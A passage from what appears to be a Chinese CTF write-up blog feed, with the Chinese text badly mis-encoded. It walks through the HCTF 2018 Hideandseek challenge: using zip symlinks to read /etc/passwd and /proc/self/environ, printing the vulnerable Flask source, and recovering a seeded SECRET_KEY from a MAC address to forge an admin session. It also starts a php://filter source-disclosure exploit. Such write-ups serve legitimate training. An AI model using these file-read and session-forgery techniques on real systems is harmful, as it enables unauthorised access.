class="hljs-keyword">if</span></span> <span class="hljs-variable">a</span>[:<span class="hljs-number">5</span>] == <span class="hljs-string">&quot;69622&quot;</span>:        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">i</span>)</span>        <span class="hljs-variable">break</span></code></pre><p>ç¼–ç ï¼ŒæŠ“åŒ…ï¼Œæ‰§è¡Œ</p><img src="/2021/08/08/cmd/8.png" alt="8"><p>è¯»å–</p><p><img src="/2021/08/08/cmd/7.png" alt="7"></p><p>å‚è€ƒï¼š<a href="https://github.com/WAY29/geek-2020-challenges/tree/main/roamphp4-rceme">https://github.com/WAY29/geek-2020-challenges/tree/main/roamphp4-rceme</a></p>]]></content>
    
    
    <categories>
      
      <category>æ— å‚RCE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuï¼ˆä¸ƒï¼‰</title>
    <link href="/2021/08/07/hate/"/>
    <url>/2021/08/07/hate/</url>
    
    <content type="html"><![CDATA[<h1>[HCTF 2018]Hideandseek</h1><p>çŸ¥è¯†ç‚¹ï¼š</p><ul><li><strong>zip è½¯é“¾æ¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–</strong></li><li><strong>linuxç³»ç»Ÿç›®å½•</strong></li><li><strong>flask sessionä¼ªé€ </strong></li></ul><p>æ²¡æœ‰æ³¨å†ŒåŠŸèƒ½ï¼Œç›´æ¥ç™»å½•ï¼Œéœ€è¦ä¸Šä¼ zipæ–‡ä»¶ï¼Œéšä¾¿ä¼ ä¸€ä¸ªï¼Œå‘ç°ä»–ä¼šç›´æ¥è¯»å–å›æ˜¾ï¼š</p><p><img src="/2021/08/07/hate/5.png" alt="5"></p><p>åˆ©ç”¨ç‚¹åº”è¯¥å°±æ˜¯ç”¨zipå»è¯»æ–‡ä»¶ã€‚</p><h4 id="è½¯é“¾æ¥è¯»å–æ–‡ä»¶"><a class="header-anchor" href="#è½¯é“¾æ¥è¯»å–æ–‡ä»¶">ğŸ­</a>è½¯é“¾æ¥è¯»å–æ–‡ä»¶</h4><p>è¿™ä¸ªåˆ©ç”¨ç‚¹æ¥è‡ªè„¸ä¹¦çš„ä¸€ä¸ªè¯»å–æ¼æ´ã€‚è½¯é“¾æ¥åˆå«ç¬¦å·é“¾æ¥ï¼Œç”¨<code>ln -s</code>åˆ›å»ºã€‚è¿™ä¸ªé“¾æ¥åŒ…å«äº†å¦ä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„åï¼šå®ƒå¯ä»¥æ˜¯ä»»æ„æ–‡ä»¶æˆ–ç›®å½•ï¼Œå¯ä»¥é“¾æ¥ä¸åŒæ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶ã€‚å°±åƒæ˜¯æ˜¯winä¸‹çš„å¿«æ·æ–¹å¼ã€‚</p><p>ç”¨æ³•ï¼š</p><pre><code class="hljs excel"><span class="hljs-built_in">ln</span> -s æºæ–‡ä»¶ ç›®æ ‡æ–‡ä»¶</code></pre><p>æ¯”å¦‚æˆ‘ä»¬è¦è¯»/etc/passwdï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥ï¼š</p><pre><code class="hljs awk">ln -s <span class="hljs-regexp">/etc/</span>passwd link</code></pre><p>å‹ç¼©æ–‡ä»¶ï¼ŒåŒæ—¶ä¿ç•™é“¾æ¥</p><pre><code class="hljs stata"><span class="hljs-keyword">zip</span> --symlinks <span class="hljs-keyword">test</span>.<span class="hljs-keyword">zip</span> link   #symlinksæ˜¯kali/Ubuntuä¸‹ç»´æŒè½¯é“¾æ¥ï¼ˆç¬¦å·é“¾æ¥ï¼‰çš„å‘½ä»¤</code></pre><p>ç„¶åä¸Šä¼ test.zipæ–‡ä»¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è§£å‹ç¼©ï¼Œé¡µé¢å½“ä¸­ä¼šè¿”å›/etc/passwdçš„å†…å®¹ã€‚</p><h4 id="æ€è·¯"><a class="header-anchor" href="#æ€è·¯">ğŸ­</a>æ€è·¯</h4><p>ä¹‹å‰åœ¨ç™»å½•çš„æ—¶å€™adminå›æ˜¾you are not adminï¼Œè§‚å¯Ÿä¸€ä¸‹session</p><p><img src="/2021/08/07/hate/6.png" alt="6"></p><p>è§£ç ï¼š{â€œusernameâ€: â€œ1â€}ï¼Œåº”è¯¥æ˜¯è¦flask-sessionä¼ªé€ äº†ï¼ŒçŒœæµ‹è¦ç”¨è½¯é“¾æ¥è¯»å–ç›¸å…³æ–‡ä»¶ä½¿å¾—å¯ä»¥ç”¨adminèº«ä»½ç™»å½•ï¼ˆæ¯•ç«Ÿå¥½å¤šé¢˜ç›®éƒ½è¿™æ ·ï¼‰ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å°±æ˜¯è¦é€šè¿‡è½¯é“¾æ¥è·å–SECRET_KEYã€‚</p><h4 id="è§£é¢˜"><a class="header-anchor" href="#è§£é¢˜">ğŸ­</a>è§£é¢˜</h4><p>ç”Ÿæˆ<code>/proc/self/environ</code>çš„è½¯é“¾æ¥ï¼Œå‹ç¼©åä¸Šä¼ ï¼Œå¾—åˆ°flaskçš„ç¯å¢ƒå˜é‡ï¼Œæ²¡ç ”ç©¶å‡ºä»€ä¹ˆæœ‰ç”¨çš„ï¼Œçœ‹äº†WPï¼Œé‡Œé¢æœ‰ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼š</p><p><img src="/2021/08/07/hate/7.png" alt="7"></p><blockquote><p>uWSGIæ˜¯ä¸€ä¸ªWebåº”ç”¨æœåŠ¡å™¨ï¼Œå®ƒå…·æœ‰åº”ç”¨æœåŠ¡å™¨ï¼Œä»£ç†ï¼Œè¿›ç¨‹ç®¡ç†åŠåº”ç”¨ç›‘æ§ç­‰åŠŸèƒ½ã€‚å®ƒæ”¯æŒWSGIåè®®ï¼ŒåŒæ—¶å®ƒä¹Ÿæ”¯æŒè‡ªæœ‰çš„uWSGIåè®®.</p></blockquote><p>è¯»ä¸€ä¸‹ï¼š</p><p><img src="/2021/08/07/hate/8.png" alt="8"></p><p>WPè¯´è¿™ä¸ªé¢˜ç›®æœ‰bugï¼ŒåŸé¢˜æºç åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼š<code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code>ï¼Œbuuç¯å¢ƒæ²¡å¼„å¥½ï¼Œåªæ˜¾ç¤ºäº†mainï¼Œè¯»ä¸€ä¸‹å¾—åˆ°æºç ï¼š</p><pre><code class="hljs vim"># -*- codin<span class="hljs-variable">g:</span> utf-<span class="hljs-number">8</span> -*-from flask import Flask,session,render_template,redirect, url_for, <span class="hljs-built_in">escape</span>, request,Responseimport uuidimport base64import randomimport flagfrom werkzeug.utils import secure_filenameimport osrandom.seed(uuid.getnode())app = Flask(__name__)app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = str(random.random()*<span class="hljs-number">100</span>)app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">&#x27;./uploads&#x27;</span>app.config[<span class="hljs-string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="hljs-number">100</span> * <span class="hljs-number">1024</span>ALLOWED_EXTENSIONS = <span class="hljs-keyword">set</span>([<span class="hljs-string">&#x27;zip&#x27;</span>])def allowed_file(filename):    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span> in filename <span class="hljs-built_in">and</span> \           filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>].lower() in ALLOWED_EXTENSIONS@app.route(<span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])def <span class="hljs-built_in">index</span>():    error = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-keyword">if</span>(error == <span class="hljs-string">&#x27;1&#x27;</span>):        session.<span class="hljs-keyword">pop</span>(<span class="hljs-string">&#x27;username&#x27;</span>, None)        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, forbidden=<span class="hljs-number">1</span>)    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> in session:        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, user=session[<span class="hljs-string">&#x27;username&#x27;</span>], flag=flag.flag)    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)@app.route(<span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])def login():    username=request.form[<span class="hljs-string">&#x27;username&#x27;</span>]    password=request.form[<span class="hljs-string">&#x27;password&#x27;</span>]    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span> <span class="hljs-built_in">and</span> username != <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-built_in">and</span> password != <span class="hljs-string">&#x27;&#x27;</span>:        <span class="hljs-keyword">if</span>(username == <span class="hljs-string">&#x27;admin&#x27;</span>):            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>,error=<span class="hljs-number">1</span>))        session[<span class="hljs-string">&#x27;username&#x27;</span>] = username    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))@app.route(<span class="hljs-string">&#x27;/logout&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])def logout():    session.<span class="hljs-keyword">pop</span>(<span class="hljs-string">&#x27;username&#x27;</span>, None)    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))@app.route(<span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])def upload_file():    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;the_file&#x27;</span> not in request.<span class="hljs-keyword">file</span><span class="hljs-variable">s:</span>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))    <span class="hljs-keyword">file</span> = request.<span class="hljs-keyword">files</span>[<span class="hljs-string">&#x27;the_file&#x27;</span>]    <span class="hljs-keyword">if</span> <span class="hljs-keyword">file</span>.filename == <span class="hljs-string">&#x27;&#x27;</span>:        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))    <span class="hljs-keyword">if</span> <span class="hljs-keyword">file</span> <span class="hljs-built_in">and</span> allowed_file(<span class="hljs-keyword">file</span>.filename):        filename = secure_filename(<span class="hljs-keyword">file</span>.filename)        file_save_path = os.path.<span class="hljs-keyword">join</span>(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)        <span class="hljs-keyword">if</span>(os.path.<span class="hljs-built_in">exists</span>(file_save_path)):            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;This file already exists&#x27;</span>        <span class="hljs-keyword">file</span>.save(file_save_path)    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;This file is not a zipfile&#x27;</span>    <span class="hljs-keyword">try</span>:        extract_path = file_save_path + <span class="hljs-string">&#x27;_&#x27;</span>        os.<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="hljs-string">&#x27; -d &#x27;</span>+ extract_path)        read_obj = os.popen(<span class="hljs-string">&#x27;cat &#x27;</span> + extract_path + <span class="hljs-string">&#x27;/*&#x27;</span>)        <span class="hljs-keyword">file</span> = read_obj.<span class="hljs-keyword">read</span>()        read_obj.<span class="hljs-keyword">close</span>()        os.<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;rm -rf &#x27;</span> + extract_path)    except Exception <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>:        <span class="hljs-keyword">file</span> = None    os.<span class="hljs-built_in">remove</span>(file_save_path)    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">file</span> != None):        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">file</span>.<span class="hljs-keyword">find</span>(base64.b64decode(<span class="hljs-string">&#x27;aGN0Zg==&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) != -<span class="hljs-number">1</span>):            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>, error=<span class="hljs-number">1</span>))    <span class="hljs-keyword">return</span> Response(<span class="hljs-keyword">file</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    #app.run(<span class="hljs-keyword">debug</span>=True)    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-keyword">debug</span>=True, port=<span class="hljs-number">10008</span>)</code></pre><p>å¯ä»¥çœ‹åˆ°flagåœ¨<code>/app/flag.py</code>æ–‡ä»¶é‡Œï¼Œè¯•äº†ä¸€ä¸‹è½¯é“¾æ¥è¯»ä¸äº†ï¼Œåªèƒ½æ‰¾<code>SECRET_KEY</code>äº†ï¼Œæºç ä¸­ï¼š</p><p><code>app.config['SECRET_KEY'] = str(random.random()*100)</code></p><p>SECRET_KEYéšæœºç”Ÿæˆï¼Œä½†ç»™äº†ç§å­ï¼š</p><p><code>random.seed(uuid.getnode())</code></p><p>ä¹‹å‰è®²è¿‡randomç”Ÿæˆçš„æ•°ä¸æ˜¯çœŸæ­£çš„éšæœºæ•°ï¼Œè€Œæ˜¯ä¼ªéšæœºæ•°ï¼Œåˆ©ç”¨ä¼ªéšæœºæ•°çš„ç‰¹æ€§ï¼Œåªè¦ç§å­æ˜¯ä¸€æ ·çš„ï¼Œåé¢äº§ç”Ÿçš„éšæœºæ•°å€¼ä¹Ÿä¼šä¸€è‡´ã€‚</p><p><img src="/2021/08/07/hate/9.png" alt="9"></p><p>macåœ°å€æ€ä¹ˆè·å¾—</p><p><img src="/2021/08/07/hate/10.png" alt="10"></p><p>è¯»/sys/class/net/eth0/addresså¾—macåœ°å€ï¼š02:42:ac:10:87:3d</p><p>ç”¨è„šæœ¬å¤„ç†</p><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> <span class="hljs-type">uuid</span><span class="hljs-keyword">import</span> randommac = &quot;02:42:ac:10:87:3d&quot;<span class="hljs-keyword">temp</span> = mac.split(<span class="hljs-string">&#x27;:&#x27;</span>)<span class="hljs-keyword">temp</span> = [<span class="hljs-type">int</span>(i,<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-keyword">temp</span>]<span class="hljs-keyword">temp</span> = [bin(i).replace(<span class="hljs-string">&#x27;0b&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-keyword">temp</span>]<span class="hljs-keyword">temp</span> = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>(<span class="hljs-keyword">temp</span>)mac = <span class="hljs-type">int</span>(<span class="hljs-keyword">temp</span>,<span class="hljs-number">2</span>)random.seed(mac)randStr = str(random.random()*<span class="hljs-number">100</span>)print(randStr) #å¾—<span class="hljs-number">85.57286294786866</span></code></pre><p>ä¼ªé€ ä¸€ä¸‹</p><p><img src="/2021/08/07/hate/11.png" alt="11"></p><p>æ›¿æ¢</p><img src="/2021/08/07/hate/12.png" alt="12" style="zoom:50%;"><p>å‚è€ƒï¼š<a href="https://www.freesion.com/article/14231062121/">https://www.freesion.com/article/14231062121/</a></p><h1>[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp2-Myblog</h1><p>é¢˜ç›®æœ‰ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œä½†æ˜¯å°è¯•äº†ä¸€ä¸‹æ³¨å…¥ä¸äº†ï¼›æµ‹è¯•ä¸€åœˆå‘ç°ä¸ç®¡è®¿é—®ä»€ä¹ˆç•Œé¢ï¼Œurléƒ½æ˜¯<code>?page=xxx</code>ï¼Œè¯•ä¸€ä¸‹ä¼ªåè®®è¯»å–æºç ï¼š<code>?page=php://filter/read=convert.base64-encode/resource=login.php </code>,è¯»å–ä¸å‡ºæ¥ï¼Œä½†æ˜¯é¦–é¡µurlçš„æœ«å°¾æ˜¯<code>?page=home</code>ï¼Œæ²¡æœ‰åç¼€ï¼Œè¯•è¯•å»æ‰<code>.php</code>ï¼š</p><p><img src="/2021/08/07/hate/3.png" alt="3"></p><p>è§£ç ä¸€ä¸‹ï¼Œlogin.phpï¼š</p><pre><code class="hljs php-template"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;robots&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;all,follow&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://ajax.aspnetcdn.com/ajax/bootstrap/4.2.1/css/bootstrap.min.css&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/style.default.css&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;theme-stylesheet&quot;</span>&gt;</span></span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;page login-page&quot;</span>&gt;</span></span><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container d-flex align-items-center&quot;</span>&gt;</span></span><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-holder has-shadow&quot;</span>&gt;</span></span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span></span><span class="xml">            <span class="hljs-comment">&lt;!-- Logo &amp; Information Panel--&gt;</span></span><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-lg-6&quot;</span>&gt;</span></span><span class="xml">              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;info d-flex align-items-center&quot;</span>&gt;</span></span><span class="xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span></span><span class="xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;logo&quot;</span>&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>æ¬¢è¿ç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><span class="xml">                  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>â€”â€” åšå®¢åå° â€”â€”<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">              <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">            <span class="hljs-comment">&lt;!-- Form Panel    --&gt;</span></span><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-lg-6 bg-white&quot;</span>&gt;</span></span><span class="xml">              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form d-flex align-items-center&quot;</span>&gt;</span></span><span class="xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span></span><span class="xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/?page=admin/user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-validate&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginFrom&quot;</span>&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span></span><span class="xml">                      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;login-username&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">required</span> <span class="hljs-attr">data-msg</span>=<span class="hljs-string">&quot;è¯·è¾“å…¥ç”¨æˆ·å&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;ç”¨æˆ·å&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-material&quot;</span>&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span></span><span class="xml">                      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;login-password&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">required</span> <span class="hljs-attr">data-msg</span>=<span class="hljs-string">&quot;è¯·è¾“å…¥å¯†ç &quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;å¯†ç &quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-material&quot;</span>&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>ç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: -40px;&quot;</span>&gt;</span> </span><span class="xml">                    <span class="hljs-comment">&lt;!-- &lt;input type=&quot;checkbox&quot;  id=&quot;check1&quot;/&gt;&amp;nbsp;&lt;span&gt;è®°ä½å¯†ç &lt;/span&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;check2&quot;</span>/&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>è‡ªåŠ¨ç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> --&gt;</span><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control custom-checkbox &quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: right;&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control-input&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;check2&quot;</span> &gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control-label&quot;</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;check2&quot;</span>&gt;</span>è‡ªåŠ¨ç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control custom-checkbox &quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: right;&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control-input&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;check1&quot;</span> &gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control-label&quot;</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;check1&quot;</span>&gt;</span>è®°ä½å¯†ç <span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> </span><span class="xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">                  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><span class="xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>æ²¡æœ‰è´¦å·?<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;signup&quot;</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>ä¸ç»™æ³¨å†Œ<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><span class="xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">              <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">    <span class="hljs-comment">&lt;!-- JavaScript files--&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span 